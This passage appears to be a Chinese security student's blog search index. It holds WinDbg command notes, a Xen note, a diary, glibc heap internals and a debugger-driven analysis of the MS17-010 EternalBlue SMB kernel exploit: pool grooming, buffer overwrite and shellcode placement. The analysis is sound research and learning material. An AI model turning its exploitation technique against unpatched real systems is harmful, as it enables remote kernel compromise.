按照名称排序 x /z ..            按照大小排序 x !               列出所有模块 x ntdll!          列出 ntdll 模块 x /t /v ntdll!*    列出 ntdll 模块数据类型和符号类型 .reload                            重新加载符号信息 .reload [/f | /v]                /f 强制立即加载符号 /v 显示详细信息 .reload [/f | /v] Module     Module 为指定模块加载符号信息 .reload /f @”ntdll.dll” .reload /f @”C:\\WINNT\\System32\\verifier.dll”   模块   lm[ v | l | k | u | f ] [m Pattern] 显示已加载的模块 lm   显示所有加载和未加载的模块信息 lmv 显示已加载模块的详细信息 lml  同时显示加载的符号信息 lmk 显示内核模块信息 lmu 显示用户模块信息 lmf  显示镜像路径 lmm 匹配模块名称 lmD 使用 DML 方式显示 lmv m kernel32 显示 kernel32 模块详细信息 !dlls         列出所有加载的模块和加载数量 !dlls -i      根据初始化顺序 !dlls -l      根据加载顺序（默认项） !dlls -m    根据内存顺序 !dlls -v     显示更多详细信息 !dlls -c _ModuleAddr  _仅显示 ModuleAddr 地址的模块信息 !dlls -?     显示帮助 !dlls -v -c kernel32 显示 kernel32.dll 的信息 !lmi _Module    _显示模块的详细信息，包括加载符号信息 !lmi kernel32  显示 kernel32.dll 模块的信息   ","categories": [],
        "tags": ["windbg"],
        "url": "https://zjgcjy.github.io/posts/2019-03/windbg.html",
        "teaser":null},{
        "title": "Ms17 010",
        "excerpt":"   MS17-010永恒之蓝分析      PagedPool 和 NoPagedPool   Windows把虚拟地址分为用户地址空间和系统地址空间，用户地址空间是给应用程序使用的，系统地址空间是给系统核心和驱动程序使用的。 系统地址空间分为分页池和非分页池。PagedPool是分页内存，简单来说就是物理内存不够时，会把这片内存移动到硬盘上，而NonPagedPool是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。在内核里，PagedPool和 NonPagedPool都是可读可写可执行的， 而且没有类似VirtualProtect之类的函数。   分页池是指映射到分页文件的虚拟地址，当要使用该地址时才交换到物理内存中，由系统来调度；非分页池是指直接在物理内存中分配的内存。“页面缓冲池”就是进程占用的分页池中的虚拟内存，是进程调用某些系统功能时，由系统核心或者驱动程序分配的。如果一个程序占用的页面缓冲池内存不断增大，就是内存泄露，通常应该是创建或打开了句柄没有关闭。   系统资源主要有四种：分页池、未分页池、系统分页表和系统缓存。系统缓存容易理解，系统分页表则是用来保存所有线程使用到的堆栈（Windows所有的线程都具有自己的堆栈），分页池和未分页池则是所有程序的核心模式组件使用到的内存部分，区别只是未分页池里分配的内存是不能交换到虚拟内存上面的，分页池上的则可以（从而可能保存到磁盘上去，当程序需要这些页面的时候，再读到内存里面来）。 例如设备驱动就使用未分页池（假如放到虚拟内存并被交换到磁盘上时可能会发生灾难性的后果）。这些资源短缺的时候系统将会发生不可预料的事情，分页池吃紧的时候系统将会频繁地使用虚拟内存，从而不停读写磁盘减低性能，而未分页池吃紧的时候系统多半已经踏入鬼门关了。   总结两句： 1.NonPagedPool的总量是有限的（ 具体大小和你物理内存的大小相关）， 而PagedPool的总量较多。申请了内存忘记释放都会造成内存泄漏，但是很明显忘记释放NonPagedPool的后果要严重得多； 2.一般来说，PagedPool用来放数据（比如你用ZwQuerySystemInformation枚举内核模块，可以申请一大片PagedPool存放返回的数据），而NonPagedPool用来放代码（你写内核shellcode并需要执行时， 必须使用NonPagedPool存放shellcode）。   Windows kernel pool   漏洞原理   MS17-010漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA（File Extended attributes）转换时，在大非分页池（内核的数据结构，Large Non-Paged Kernel Pool）上存在缓冲区溢出。函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小。然后会进行如下操作：      srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小。   因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大。   因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出。   在Srv.sys中的SrvOs2FeaListToNt函数中，会有以下调用关系：   SrvOs2FeaListToNt     SrvOs2FeaListSizeToNt         *****bug*****     SrvOs2FeaToNt         memmove             *****crash*****   poc   下图所示是，调试poc时，crash之后的栈，我们根据栈回溯定位可以看到，srv!SrvOs2FeaListToNt调用了srv!SrvOs2FeaToNt，再调用memmove函数，这里崩掉的原因是memmove函数的参数过大，导致拷贝越界。      其中在SrvOs2FeaListSizeToNt中因为有一个DWORD转WORD并赋值的bug，造成在SrvOs2FeaListToNt的一个循环中，SrvOs2FeaToNt被调用的次数会多于预期，而造成SrvOs2FeaToNt中的一个memmove拷贝越界。如果参数大于0x10000，因为word类型的原因，求得的返回值会变大，下图是输入的参数。      这时候edi指向了payload，使用pool命令查看：   kd&gt; !pool edi Pool page 9839a0d8 region is Paged pool *9839a000 : large page allocation, tag is LStr, size is 0x11000 bytes Pooltag LStr : SMB1 transaction, Binary : srv.sys   所以edi指向的就是传入参数，FEA。当srv!SrvOs2FeaListSizeToNt执行完后，返回值变大。      在求得返回值变大之后，srv!SrvOs2FeaListToNt会调用srv!SrvOs2FeaToNt对list进行遍历，而最后一次调用的参数是0xcc00，如下图所示。      在这最后一次srv!SrvOs2FeaToNt中，这里就调用memmove从分页池的第二段payload复制到非分页池中，很明显这里的参数是肯定太大了，导致了最后的问题，分页池用完，超预期的长度，越界读取导致bsod。      非分页池情况：      exp   那么EternalBlue是如何利用的呢？首先发送一个SRV buffer除了最后一个数据包。这是因为大非分页池将在会话中最后一个数据包被服务端接收的时候被建立。SMB服务器会把会话中接受到的数据读取并叠加起来放入输入缓冲区中。所有的数据会在TRANS包中被标明。当接收到所有的数据后SMB服务器将会处理这些数据。数据通过CIFS(Common Internet File System)会被分发到SrvOpen2函数中来读取。   EternalBlue发送的所有数据会被SMB服务器收到后，SMB服务器会发送SMB ECHO包。因为攻击可以在网速很慢的情况下实现，所以SMB ECHO是很重要的。   在我们的分析中，即使我们发送了初始数据，存在漏洞的缓冲区仍然没有被分配在内存中。      FreeHole_A: EternalBlue通过发送SMB v1数据包来完成占位   SMBv2_1n: 发送一组SMB v2数据包   FreeHole_B: 发送另一个占位数据包；必须确保第一个占位的FreeHole_A被释放之前，这块内存被分配   FreeHole_A_CLOSE: 关闭连接，使得第一个占位的内存空间被释放。   SMBv2_2n: 发送一组SMB v2数据包。   FreeHole_B_CLOSE: 关闭连接来释放缓冲区。   FINAL_Vulnerable_Buffer: 发送最后的数据包，这个数据包将会被存储在有漏洞的缓冲区中。   windbg调试过程   exp最后的结果是srv!SrvTransaction2DispatchTable中的第0xe项被替换。   kd&gt; dds srv!SrvTransaction2DispatchTable 95744530  9576c56f srv!SrvSmbOpen2 95744534  95766fe4 srv!SrvSmbFindFirst2 95744538  9576706d srv!SrvSmbFindNext2 9574453c  95769a89 srv!SrvSmbQueryFsInformation 95744540  9576a2f3 srv!SrvSmbSetFsInformation 95744544  95760f65 srv!SrvSmbQueryPathInformation 95744548  95761c74 srv!SrvSmbSetPathInformation 9574454c  9576077c srv!SrvSmbQueryFileInformation 95744550  9576155d srv!SrvSmbSetFileInformation 95744554  9576a4e5 srv!SrvSmbFindNotify 95744558  9576797a srv!SrvSmbIoctl2 9574455c  9576a4e5 srv!SrvSmbFindNotify 95744560  9576a4e5 srv!SrvSmbFindNotify 95744564  957625fb srv!SrvSmbCreateDirectory2 95744568  9576cf2b srv!SrvTransactionNotImplemented(******bug******) 9574456c  9576cf2b srv!SrvTransactionNotImplemented 95744570  95753107 srv!SrvSmbGetDfsReferral 95744574  95752ff7 srv!SrvSmbReportDfsInconsistency   至于为什么会替换这个，应该是最后一次SMB通信就是transaction2，当数据包发过来的时候，会调用这个表，就会执行自定义函数。   首先下断点查看是哪里在写向这个地址写值。   ba w1 srv!SrvTransaction2DispatchTable+0xe*4      可以看到此时：      eip位于HAL地址空间中，显然是不对的   ebx指向srv!SrvTransaction2DispatchTable表头部   eax指向被替换的函数地址。   于是我们将整个段保存下来查看。   .writemem C:\\Users\\zjgcj\\Desktop\\sc.bin ffdff000 l0x1000   可以找到shellcode的起始地址。是在ffdff1f1这个地方，位于HAL地址空间中。   d&gt; !address ffdff1f1 Base Address:           ffdf1000 End Address:            ffffffff Region Size:            0020f000 VA Type:                HAL   wrk中有定義這塊地址的作用，如下： // addressed from 0xffdf0000 - 0xffdfffff are reserved for the system // begin_ntddk begin_ntosp #define KI_USER_SHARED_DATA 0xffdf0000 #define SharedUserData ((KUSER_SHARED_DATA * const) KI_USER_SHARED_DATA)   kd&gt; u FFDFF1F1 ffdff1f1 31c0            xor     eax,eax ffdff1f3 40              inc     eax ffdff1f4 90              nop ffdff1f5 7408            je      ffdff1ff ffdff1f7 e809000000      call    ffdff205 ffdff1fc c22400          ret     24h ffdff1ff e8a7000000      call    ffdff2ab ffdff204 c3              ret   这时我们需要知道控制流是如何转移过来的，以及数据流是如何被写到HAL的地址空间中的。   ba w1 FFDFF1F1 ba e1 FFDFF1F1   由于一个地址只能下一个断点，因为先写再执行，所以我们先看写的情况。      可以看到，此时程序位于tcp的协议栈中，在执行memcpy的过程中，错误的将srvnet非分页缓冲池中的数据复制到HAL的地址空间中。为什么会发生这样的情况，最后再看。   然后我们再来看执行的情况。      在srvnet!SrvNetCommonReceiveHandler这个函数中，eax的值被指向了shellcode的地址附近，之后便调用了shellcode。之后我们需要知道这个值是怎么来的。 根据网上的资料，我们可以知道如下的函数调用关系。   srvnet!SrvNetWskReceiveComplete     srvnet!SrvNetIndicateData         srvnet!SrvNetCommonReceiveHandler   srvnet!SrvNetWskReceiveComplete这个函数是个IRP的完成例程。第三个参数Context是IRP的Context。Context 偏移0×24 处，存放了一个指针，里面存放了连接信息，我们姑且称其为Connection吧。这个Connection 会被作为第一个参数，传入srvnet!SrvNetIndicateData，而紧接着又会被作为第一个参数传入到srvnet!SrvNetCommonReceiveHandler。而Contex 由srvnet!SrvNetAllocateBuffer分配，类型是SRVNET_BUFFFER      该结构的0×24处的Connection被损坏了，被修改成了HAL中的地址空间。然后我们再下断点即可。   bu srvnet!SrvNetWskReceiveComplete+17 \".if(@edi==ffdff020){} .else{gc}\"   然后我们可以看到如下的结果，同时我们查看esi所在的地址，是srvnet分配的非分页池。但是其实这段数据是srv中memmove的目的地址，所以这里其实已经越界写了。   kd&gt; dd esi 885a7010  0000ffff 00000000 00000000 00000000 885a7020  00000000 00000000 ffdff100 00000000 885a7030  00000000 [***ffdff020***] ffdff100 ffffffff 885a7040  10040060 00000000 ffdfef80 00000000 885a7050  ffd00010 ffffffff ffd00118 ffffffff 885a7060  00000000 00000000 00000000 00000000 885a7070  10040060 00000000 00000000 00000000 885a7080  ffcfff90 ffffffff 00000000 00000000 kd&gt; !pool esi Pool page 885a7010 region is Nonpaged pool *885a7000 : large page allocation, tag is LSbf, size is 0x11000 bytes Pooltag LSbf : SMB1 buffer descriptor or srvnet allocation, Binary : srvnet.sys   为什么这段数据是memmove拷过来的，调试一下就行了，打印出每次的地址喝参数。   bp srv!srvOs2FeaToNt+4d \".printf\\\"memmove from %x to %x length %x\\\\n\\\", poi(@esp+4), poi(@esp), poi(@esp+8);gc\"   可以看到最后2次复制的长度，且最后一次的长度是a8。   ba e1 srv!SrvOs2FeaToNt+0x4d \".if(poi(esp+8) != a8){gc} .else {}\"   正常情况是在srv.sys对象SMB buffer中，但由于长度过长导致对srvnet.sys分配的buffer越界写。      至于为什么会拷贝越界就是前面进行结构体转换的时候，大小计算错误。   那么我们回过头再来看，shellcode是在SMB通信的时候写入srv中的非分页池的，在执行完memmove之后，越界写到了srvnet的非分页池中，但是最后shellcode执行的时候是处于HAL中，期间又发生了什么呢。再次下断点调试。   ba w1 ffdff1f1      可以看到，memmove拷贝的时候，覆盖掉的不仅仅是Context-&gt;Connection。他同时也覆盖了相邻SRVNET_BUFFER.MDL的内容(偏移0x2c起)，从而使得TCP/IP协议栈拷贝到了ffdff1f1内存中。在x86上，ffdf1000开始到ffffffff地址，都是保留给HAL用的。   0000ffff 00000000 00000000 00000000 00000000 00000000 ffdff100 00000000 00000000 ffdff020*****bug***** ffdff100 ffffffff 10040060 00000000 ffdfef80*****bug*****   Srvnet 对象buffer中包含两个重要的域：      一个指向指定结构（srvnet_recv）的指针（即上图中的8834e4c0，被ffdff020覆盖），该指针将会在smb(srnet)连接结束或断开 时被用于寻址函数地址。   一个用于接收缓冲区的MDL（即上图中的86546160，被ffdfef80覆盖）   因此覆盖并控制MDL将导致之后的tcp 栈实现任意写入伪造对象的操作，覆盖并控制该指针可用于将其指向一个攻击者控制的伪造对象，此时断开smb(srvnet)连接即可导致代码执行。   总结   首先，歹发送SMB 的 Session Setup AndX (0×73) 命令，跟据其响应中的 Native OS 获取 目标操作系统的版本信息。   他利用了SMB.SMB_COM_NT_TRANSACT SMB_COM_TRANSACTION2_SECONDARY 在内存中精心布局，形成了一些连续的SRVNET_BUFFER内存区域。然后他关闭了一个链接，从而释放掉一个SRVNET_BUFFER，而这个释放掉的SRVNET_BUFFER空洞恰恰又会被FeaList 分配内存时重用(有图为证)。而SrvOs2FeaListToNt 中的Bug又导致了拷贝时越界，直接覆盖掉了其后的SRVNET_BUFFER，修改了MDL。于是后面的发送的数据就被错误的拷贝到了MDL 指定的内存中，也就是HAL保留的内存。而这时，歹人开始了致命的以一击，发送最后一个SMB_COM_TRANSACTION2_SECONDARY 分片，从而触发了控制转移。         参考资料   # MS17-010漏洞復現(x32)以及分析 深入剖析勒索软件传播方式 狄仁杰探案之“永恒之蓝” EternalBlue Shellcode详细分析 WannaCry勒索软件中“永恒之蓝”漏洞利用分析 MS17-010深入分析“永恒之蓝”漏洞 NSA Eternalblue SMB 漏洞分析 免考实验与研究——MS17-010漏洞研究 EternalBlue工具漏洞利用细节分析 NSA武器库之Eternalblue SMB漏洞浅析   后记   和学姐讨论了，她的意思是在ring3上有程序直接调用了srv.sys，但是根据以下资料，我表示怀疑，而且栈回溯也看不到ring3的应用层，应该是通过os直接控制了。   https://www.computerhope.com/   https://www.reviversoft.com/zh-cn/processes/srv.sys   https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/what-is-a-driver-  ","categories": [],
        "tags": ["cve"],
        "url": "https://zjgcjy.github.io/posts/2019-03/MS17-010.html",
        "teaser":null},{
        "title": "Xen手册",
        "excerpt":"   Xen配置手册      Xen启动手册   启动虚拟机 xl create win721.cfg   打开图形界面 gvncviewer 127.0.0.1   列出所有虚拟化环境？ xl li   设置白名单 ./send_white_list   打开打印通道 id号 1 ./openprintk 1 1   开始捕获 ./catch_win732_new   查看日志 xl dmesg   清除日志 xl dmesg -c  ","categories": [],
        "tags": ["xen"],
        "url": "https://zjgcjy.github.io/posts/2019-03/Xen%E6%89%8B%E5%86%8C.html",
        "teaser":null},{
        "title": "三月日记",
        "excerpt":"   每日所作所得      3月28日   上午   翻译论文，毕设进展缓慢。继续搭建XEN调试环境，网络调试不可行，只能1394端口、串口和USB，笔记本没有1394，USB好像也不行，只能串口？一脸懵逼。   下午   继续学习ptmalloc下的malloc管理方式。还在折腾XEN环境，USB3肯定不行了，USB2需要的电缆很贵，看看有没有其他办法。无意间看到google的summer of code，想参加，了解之后，怕是在做梦。   晚上   复习了malloc的所有chunk分配bins和维护链表。   3月29日   上午   看了heap的exploitation。继续折腾环境，看了学姐说的2个方法，貌似都不行，后来又试了一下windbg的local mode，成功起来，但没卵用，大部分命令都不支持，要你何用。   下午   继续看malloc的系统实现，brk和mmap，然后和学姐商量暂时放弃调试。参加了讨论班，学姐讲的是机器学习检测同驻虚拟机里的监视进程，听不太懂。   晚上   看glibc中的malloc实现，对多线程共享arena有了一定了解，没看其他的东西。   3月30日   摸鱼的一天   3月31日   上午   摸鱼   下午   打篮球，跑步   晚上   休闲娱乐，帮钱思秋看了一个shellcode的问题。  ","categories": [],
        "tags": ["日记"],
        "url": "https://zjgcjy.github.io/posts/2019-03/%E4%B8%89%E6%9C%88%E6%97%A5%E8%AE%B0.html",
        "teaser":null},{
        "title": "Heap 1",
        "excerpt":"   堆的结构和利用方式介绍    资料来源： heap-exploitation教程 malloc中的系统调用 深入理解glibc-malloc how2heap的教程 ctf-wiki中的教程     malloc   malloc(size_t n)   可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理      当 n=0 时，返回当前系统允许的堆的最小内存块。   当 n 为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。   free   free(void* p)   可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。此外，该函数也同样对异常情况进行了处理：      当 p 为空指针时，函数不执行任何操作。   当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。   除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。   内存分配背后的系统调用   在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk函数以及mmap, munmap函数。   这部分直Syscalls used by malloc接查看另一篇文章。这里只放出一张图片。      malloc_chunk的数据结构   首先看一下malloc分配的数据结构，注意已经分配的chunks和未分配的chunks是不一样的。   struct malloc_chunk {   INTERNAL_SIZE_T      mchunk_prev_size;  /* 前一个chunk的大小，free时使用  */   INTERNAL_SIZE_T      mchunk_size;       /* 包括头部的总大小 */   struct malloc_chunk* fd;                /* 双向链表，free时使用 */   struct malloc_chunk* bk;   /* 大型块使用，下一个大型块的指针。*/   struct malloc_chunk* fd_nextsize; /* 双向链表，free时使用 */   struct malloc_chunk* bk_nextsize; };  typedef struct malloc_chunk* mchunkptr;   Allocated chunk       chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Size of previous chunk, if unallocated (P clear)  |             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Size of chunk, in bytes                     |A|M|P|       mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             User data starts here...                          .             .                                                               .             .             (malloc_usable_size() bytes)                      .             .                                                               | nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             (size of chunk, but used for application data)    |             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Size of next chunk, in bytes                |A|0|1|             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   Free chunk       chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Size of previous chunk, if unallocated (P clear)  |             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     `head:' |             Size of chunk, in bytes                     |A|0|P|       mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Forward pointer to next chunk in list             |             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Back pointer to previous chunk in list            |             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Unused space (may be 0 bytes long)                .             .                                                               .             .                                                               | nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     `foot:' |             Size of chunk, in bytes                           |             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+             |             Size of next chunk, in bytes                |A|0|0|             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   P (PREV_INUSE): 0 当前一个chunk是空闲的时候，因此前一个chunk的大小被存储在第一个区域中。分配的第一个块设置这个标志位。如果是1，我们不能确定前一个chunk的大小。   M (IS_MMAPPED): chunk是否通过mmap分配。如果是，其他2位将忽略。mmapped 分配的chunk既不在arean中，也不与空闲块相邻。   A (NON_MAIN_ARENA): 0说明了chunk在main arean中， 每一个线程都有自己的arean对于这些chunk，设置这个标志位。   注意：fastbin中的块被视为分配的块，因为它们没有与相邻的空闲块合并。   malloc_state   这个结构展示arean的头部信息。主线程是一个全局变量，且不是堆段的一部分。其他线程的arean的头部被存储在堆段中。非main areans可以拥有很多堆，堆指代内部结构而不是堆段。   struct malloc_state {   /* Serialize access.  */   __libc_lock_define (, mutex);   /* Flags (formerly in max_fast).  */   int flags;    /* Fastbins */   mfastbinptr fastbinsY[NFASTBINS];   /* Base of the topmost chunk -- not otherwise kept in a bin */   mchunkptr top;   /* The remainder from the most recent split of a small request */   mchunkptr last_remainder;   /* Normal bins packed as described above */   mchunkptr bins[NBINS * 2 - 2];    /* Bitmap of bins */   unsigned int binmap[BINMAPSIZE];    /* Linked list */   struct malloc_state *next;   /* Linked list for free arenas.  Access to this field is serialized      by free_list_lock in arena.c.  */   struct malloc_state *next_free;   /* Number of threads attached to this arena.  0 if the arena is on      the free list.  Access to this field is serialized by      free_list_lock in arena.c.  */    INTERNAL_SIZE_T attached_threads;   /* Memory allocated from the system in this arena.  */   INTERNAL_SIZE_T system_mem;   INTERNAL_SIZE_T max_system_mem; };  typedef struct malloc_state *mstate;   Bins and Chunks   bin是一个由空闲块(非分配的)组成的列表(双链表或单链表)。bins是有差别的，根据它们所包含的块的大小来区分。      Fast bin   Unsorted bin   Small bin   Large bin   fastbins是被下面这个维护的。   typedef struct malloc_chunk *mfastbinptr; mfastbinptr fastbinsY[]; // Array of pointers to chunks   Unsorted, small 和 large bins 使用单个数组进行维护。   typedef struct malloc_chunk* mchunkptr; mchunkptr bins[]; // Array of pointers to chunks   初始化的过程中，small和large bins是空的。每一个bin通过2个值来表示。第一个值是指向HEAD的指针，第二个是指向TAIL的指针。在fastbins（单链表），第二个值是NULL。   fast bins   fast bins 一共有10个。每一个都维护一个单链表，添加和删除发生在列表的最前面（先进后出，和栈差不多），每一个bins都维护着相同大小的chunks，这10个值是16, 24, 32, 40, 48, 56, 64, 72, 80 和 88，这里说的大小还包括元数据。只有 prev_size 和size会控制已经分配的元数据。下一个连续chunk的prev_size 将会存储用户数据。   没有两个相邻的free chunks会合并在一起。   unsorted bins   unsorted bins只有一条，包括small bins和large bins。这个bins的主要目的是充当缓存层(某种程度上)来加速分配和重新分配请求。   small bins   small bins共有62个。速度比large bins快，但是比fast bins慢。每一个bin维护一个双向链表。插入发生在“头部”，而删除发生在“尾部”(以FIFO方式)。 和fast bins差不多，每一个bin中的chunk大小相同，依次是16, 24, … , 504。   在释放的过程中，小chunk可能会被合并在一起，然后放入unsorted bins中。   large bins   large bins一共有63个，每一个bin维护一个双向链表，一个特别之处是large bins中chunk的大小不一样，并且以升序排列，头部最大，尾部最小。插入和删除操作会发生在列表中的任何位置。 最开始的32个bins包含的chunks是相距64的。即 第一个 bin: 512 - 568 bytes 第二个 bin: 576 - 632 bytes   总结一下：   No. of Bins       Spacing between bins  64 bins of size       8  [ Small bins] 32 bins of size      64  [ Large bins] 16 bins of size     512  [ Large bins] 8 bins of size     4096  [ ..        ] 4 bins of size    32768 2 bins of size   262144 1 bin  of size what's left   large bins和small bins一样，chunks可能会被合并，然后放入large bins。 有2个特殊的chunks不属于任何一种bin。   top chunks   top chunks和arena的顶部相邻，在遇到“malloc”请求时，它被用作最后的手段。如果还需要更大的大小，则可以使用sbrk系统调用使其增长。P (PREV_INUSE)标志位总会被设置位1。   last remainder chunk   它是从最后一个分割中获得的chunk。有时，当没有确切大小的chunk时，更大的chunk被分成两部分。一部分返回给用户，而另一部分成为last remainder chunk。   ","categories": [],
        "tags": ["pwn","heap"],
        "url": "https://zjgcjy.github.io/posts/2019-03/Heap-1.html",
        "teaser":null},{
        "title": "Malloc内部实现",
        "excerpt":"   malloc运行参与的系统调用      当读到这篇文章时，你应该知道malloc使用系统调用来从os获取内存空间，就像下面说的那样，malloc使用brk或者mmap来获取内存。      (s)brk   对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加brk的大小来向操作系统申请内存。初始时，堆的起始地址 start_brk以及堆的当前末尾 brk指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同。      不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。   开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。      上图显示的是start_brk是堆段的开始，而brk(程序中断)是堆段的结束。   例子：   /* sbrk and brk example */ #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt;  int main() {         void *curr_brk, *tmp_brk = NULL;          printf(\"Welcome to sbrk example:%d\\n\", getpid());          /* sbrk(0) gives current program break location */         tmp_brk = curr_brk = sbrk(0);         printf(\"Program Break Location1:%p\\n\", curr_brk);         getchar();          /* brk(addr) increments/decrements program break location */         brk(curr_brk+4096);          curr_brk = sbrk(0);         printf(\"Program break Location2:%p\\n\", curr_brk);         getchar();          brk(tmp_brk);          curr_brk = sbrk(0);         printf(\"Program Break Location3:%p\\n\", curr_brk);         getchar();          return 0; }   分析   在第一次输出的时候是没有heap段的，因此。      start_brk = current_brk = end_data = 0x804b000.   第二次输出就创建了heap段，因此。      start_brk = end_data = 0x804b000   current_brk = 0x804c000.   第三次调整了brk的位置，因此。      start_brk = end_data = 0x804b000   current_brk  = 0x804b000.   mmap   malloc使用mmap创建一个私有的匿名映射段。私有匿名映射的主要目的是分配新内存(零填充)，并且这个新内存将被调用进程专用。   例子：   /* Private anonymous mapping example using mmap syscall */ #include &lt;stdio.h&gt; #include &lt;sys/mman.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt;  void static inline errExit(const char* msg) {         printf(\"%s failed. Exiting the process\\n\", msg);         exit(-1); }  int main() {         int ret = -1;         printf(\"Welcome to private anonymous mapping example::PID:%d\\n\", getpid());         printf(\"Before mmap\\n\");         getchar();         char* addr = NULL;         addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);         if (addr == MAP_FAILED)                 errExit(\"mmap\");         printf(\"After mmap\\n\");         getchar();          /* Unmap mapped region. */         ret = munmap(addr, (size_t)132*1024);         if(ret == -1)                 errExit(\"munmap\");         printf(\"After munmap\\n\");         getchar();         return 0; }   分析   在mmap之前，没有heap段   在mmap之后，会创建一个具有相应权限的heap段，因为是匿名的，所以不会有heap的标志。   在munmap之后，heap段被释放，相应的内存被返还给操作系统。   上文翻译自syscalls-used-by-malloc   多线程支持   在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。   /* Per thread arena example. */ ##include &lt;stdio.h&gt; ##include &lt;stdlib.h&gt; ##include &lt;pthread.h&gt; ##include &lt;unistd.h&gt; ##include &lt;sys/types.h&gt;  void* threadFunc(void* arg) {         printf(\"Before malloc in thread 1\\n\");         getchar();         char* addr = (char*) malloc(1000);         printf(\"After malloc and before free in thread 1\\n\");         getchar();         free(addr);         printf(\"After free in thread 1\\n\");         getchar(); }  int main() {         pthread_t t1;         void* s;         int ret;         char* addr;          printf(\"Welcome to per thread arena example::%d\\n\",getpid());         printf(\"Before malloc in main thread\\n\");         getchar();         addr = (char*) malloc(1000);         printf(\"After malloc and before free in main thread\\n\");         getchar();         free(addr);         printf(\"After free in main thread\\n\");         getchar();         ret = pthread_create(&amp;t1, NULL, threadFunc, NULL);         if(ret)         {                 printf(\"Thread creation error\\n\");                 return -1;         }         ret = pthread_join(t1, &amp;s);         if(ret)         {                 printf(\"Thread join error\\n\");                 return -1;         }         return 0; }   分析   在主线程中的malloc之前：在下面的输出中，我们可以看到还没有堆段，也没有每个线程堆栈，因为还没有创建thread1。   在主线程中的malloc执行之后，heap段被创建，紧紧挨着data段，堆内存是通过调用brk的系统调用来增加heap的大小。尽管我们只请求了1000字节的大小，程序也会分配 132KB的大小。堆内存的这个连续区域称为arena。既然这个区域是由主线程创建的，所以叫main arena。接下来的分配都请求使用这一段区域，直到所有空间用完。当所有空间用完，程序会调用brk来增加heap的大小。同样，当顶部有大量空闲空间时，arena也会收缩。   在主线程中的free调用之后，我们可以发现，当被分配的内存区域被free，他背后的内存不会立即释放的操作系统。内存只释放给glibc的malloc库，之后当用户请求内存时，glibc的malloc管理器不会从内核中分配堆，相反的，他会从一个free bins中找到一个chunk。只有当没有空闲的chunk的时候，才会从内核中获取。   在thread1进行malloc之前，heap段没有被创建，但是thread1的线程栈被创建。   thread1进行malloc之后，线程heap被创建，位于内存区域中，大小是132KB，因此是mmap创建出来的（不想main 